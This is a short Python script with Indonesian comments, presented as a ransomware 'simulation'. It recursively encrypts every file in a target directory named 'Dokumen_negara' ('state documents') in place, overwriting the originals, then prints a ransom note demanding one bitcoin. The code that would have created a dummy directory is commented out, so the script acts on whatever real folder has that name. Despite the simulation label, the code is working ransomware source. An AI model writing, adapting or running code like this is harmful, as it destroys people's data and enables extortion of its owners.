import os
from cryptography.fernet import Fernet

# Simulasi: Generate key untuk enkripsi
def generate_key():
    return Fernet.generate_key()

# Simulasi: Enkripsi file
def encrypt_file(file_path, key):
    fernet = Fernet(key)
    with open(file_path, "rb") as file:
        original_data = file.read()
    encrypted_data = fernet.encrypt(original_data)
    with open(file_path, "wb") as file:
        file.write(encrypted_data)

# Simulasi: Enkripsi semua file dalam direktori
def encrypt_directory(directory_path, key):
    for root, dirs, files in os.walk(directory_path):
        for file in files:
            file_path = os.path.join(root, file)
            try:
                encrypt_file(file_path, key)
                print(f"File terenkripsi: {file_path}")
            except Exception as e:
                print(f"Gagal mengenkripsi {file_path}: {e}")

# Simulasi: Tampilkan pesan ransomware
def display_ransom_note():
    note = """
    SEMUA FILE ANDA TELAH DIENKRIPSI!
    Untuk mendekripsi file Anda, kirim 1 BTC ke alamat berikut: [ALAMAT BTC].
    Setelah pembayaran diterima, kami akan mengirimkan kunci dekripsi.
    """
    print(note)

# Simulasi: Main function
def simulate_ransomware():
    # Direktori target (gunakan direktori dummy untuk simulasi)
    target_directory = "Dokumen_negara"
    
    # Buat direktori dummy jika belum ada
    #if not os.path.exists(target_directory):
     #   os.makedirs(target_directory)
      #  print(f"Direktori dummy '{target_directory}' dibuat untuk simulasi.")
    
    # Generate key
    key = generate_key()
    
    # Enkripsi file dalam direktori
    encrypt_directory(target_directory, key)
    
    # Tampilkan pesan ransomware
    display_ransom_note()
    
    # Simpan key ke file (untuk simulasi dekripsi)
    with open("key.txt", "wb") as key_file:
        key_file.write(key)
    print("Kunci enkripsi disimpan di 'key.txt' (hanya simulasi).")

# Jalankan simulasi
if __name__ == "__main__":
    simulate_ransomware()
